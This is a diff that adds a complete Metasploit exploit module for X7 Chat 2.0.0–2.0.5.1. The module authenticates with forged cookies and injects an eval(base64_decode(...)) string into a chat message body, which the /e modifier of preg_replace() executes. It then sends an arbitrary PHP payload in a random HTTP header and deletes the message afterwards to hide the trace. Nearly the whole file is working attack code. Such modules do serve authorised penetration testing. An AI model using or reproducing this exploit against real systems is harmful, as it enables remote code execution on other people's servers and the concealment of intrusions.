@@ -1,0 +1,193 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::PhpEXE
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'X7 Chat 2.0.5 lib/message.php preg_replace() PHP Code Execution',
+      'Description'    => %q{
+        This module exploits a post-auth vulnerability found in X7 Chat versions
+        2.0.0  up to 2.0.5.1. The vulnerable code exists on lib/message.php, which
+        uses preg_replace() function with the /e modifier. This allows a remote
+        authenticated attacker to execute arbitrary PHP code in the remote machine.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Fernando Munoz <fernando[at]null-life.com>', # discovery & module development
+          'Juan Escobar <eng.jescobar[at]gmail.com>', # module development @itsecurityco
+        ],
+      'References'     =>
+        [
+          # Using this URL because isn't nothing else atm
+          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/4076']
+        ],
+      'Platform'       => 'php',
+      'Arch'           => ARCH_PHP,
+      'Targets'        => [['Generic (PHP Payload)', {}]],
+      'DisclosureDate' => 'Oct 27 2014',
+      'DefaultTarget'  => 0))
+
+      register_options(
+      [
+        OptString.new('USERNAME', [ true, 'Username to authenticate as', '']),
+        OptString.new('PASSWORD', [ true, 'Pasword to authenticate as', '']),
+        OptString.new('TARGETURI', [ true, 'Base x7 Chat directory path', '/x7chat2']),
+      ], self.class)
+  end
+
+  def check
+    res = exec_php('phpinfo(); die();', true)
+
+    if res && res.body =~ /This program makes use of the Zend/
+      return Exploit::CheckCode::Vulnerable
+    else
+      return Exploit::CheckCode::Unknown
+    end
+  end
+
+  def exec_php(php_code, is_check = false)
+
+    # remove comments, line breaks and spaces of php_code
+    payload_clean = php_code.gsub(/(\s+)|(#.*)/, '')
+
+    # clean b64 payload (we can not use quotes or apostrophes and b64 string must not contain equals)
+    while Rex::Text.encode_base64(payload_clean) =~ /=/
+      payload_clean = "#{ payload_clean } "
+    end
+    payload_b64 = Rex::Text.encode_base64(payload_clean)
+
+    cookie_x7c2u = "X7C2U=#{ datastore['USERNAME'] }"
+    cookie_x7c2p = "X7C2P=#{ Rex::Text.md5(datastore['PASSWORD']) }"
+    rand_text = Rex::Text.rand_text_alpha_upper(5, 8)
+
+    print_status("Trying for version 2.0.2 up to 2.0.5.1")
+    print_status("Sending offline message (#{ rand_text }) to #{ datastore['USERNAME'] }...")
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri.path, 'index.php'),
+      'headers'  => {
+        'Cookie' => "#{ cookie_x7c2u }; #{ cookie_x7c2p };",
+      },
+      'vars_get' => {
+        # value compatible with 2.0.2 up to 2.0.5.1
+        'act'     => 'user_cp',
+        'cp_page' => 'msgcenter',
+        'to'      => datastore['USERNAME'],
+        'subject' => rand_text,
+        'body'    => "#{ rand_text }www.{${eval(base64_decode($_SERVER[HTTP_#{ rand_text }]))}}.c#{ rand_text }",
+      }
+    })
+
+    unless res && res.code == 200
+      print_error("Sending the message (#{ rand_text }) has failed")
+      return false
+    end
+
+    if res.body =~ /([0-9]*)">#{ rand_text }/
+      message_id = Regexp.last_match[1]
+      user_panel = 'user_cp'
+    else
+      print_error("Could not find message (#{ rand_text }) in the message list")
+
+      print_status("Retrying for version 2.0.0 up to 2.0.1 a1")
+      print_status("Sending offline message (#{ rand_text }) to #{ datastore['USERNAME'] }...")
+      res = send_request_cgi({
+        'method'   => 'GET',
+        'uri'      => normalize_uri(target_uri.path, 'index.php'),
+        'headers'  => {
+          'Cookie' => "#{ cookie_x7c2u }; #{ cookie_x7c2p };",
+        },
+        'vars_get' => {
+          # value compatible with 2.0.0 up to 2.0.1 a1
+          'act'     => 'usercp',
+          'cp_page' => 'msgcenter',
+          'to'      => datastore['USERNAME'],
+          'subject' => rand_text,
+          'body'    => "#{ rand_text }www.{${eval(base64_decode($_SERVER[HTTP_#{ rand_text }]))}}.c#{ rand_text }",
+        }
+      })
+
+      unless res && res.code == 200
+        print_error("Sending the message (#{ rand_text }) has failed")
+        return false
+      end
+
+      if res.body =~ /([0-9]*)">#{ rand_text }/
+        message_id = Regexp.last_match[1]
+        user_panel = 'usercp'
+      else
+        print_error("Could not find message (#{ rand_text }) in the message list")
+        return false
+      end
+    end
+
+    print_status("Accessing message (#{ rand_text })")
+    print_status("Sending payload in HTTP header '#{ rand_text }'")
+
+    if is_check
+      timeout = 20
+    else
+      timeout = 3
+    end
+
+    res = send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => normalize_uri(target_uri.path, 'index.php'),
+      'headers'   => {
+        'Cookie'  => "#{ cookie_x7c2u }; #{ cookie_x7c2p };",
+        rand_text => payload_b64,
+      },
+      'vars_get'  => {
+        'act'     => user_panel,
+        'cp_page' => 'msgcenter',
+        'read'    => message_id,
+      }
+    }, timeout)
+
+    res_payload = res
+
+    print_status("Deleting message (#{ rand_text })")
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri.path, 'index.php'),
+      'headers'  => {
+        'Cookie' => "#{ cookie_x7c2u }; #{ cookie_x7c2p };",
+      },
+      'vars_get' => {
+        'act'     => user_panel,
+        'cp_page' => 'msgcenter',
+        'delete'  => message_id,
+      }
+    })
+
+    if res && res.body =~ /The message has been deleted/
+      print_good("Message (#{ rand_text }) removed")
+    else
+      print_error("Removing message (#{ rand_text }) has failed")
+      return false
+    end
+
+    # if check return the response
+    if is_check
+      return res_payload
+    else
+      return true
+    end
+  end
+
+  def exploit
+    unless exec_php(payload.encoded)
+      fail_with(Failure::Unknown, "#{peer} - Exploit failed, aborting.")
+    end
+  end
+end
